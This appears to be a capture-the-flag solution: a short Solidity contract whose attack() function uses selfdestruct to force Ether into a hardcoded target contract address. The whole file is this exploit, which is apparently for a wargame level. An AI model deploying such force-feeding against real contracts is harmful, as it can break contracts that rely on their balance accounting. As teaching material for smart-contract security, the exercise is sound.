pragma solidity ^0.8.0;

contract Solution {

    address payable ogContract = payable(0xBe2Daa944a16bF8C35d49aa073B9380d205b413D);

    function attack() public payable {
        require(msg.value > 0);
        selfdestruct(ogContract);
    }
}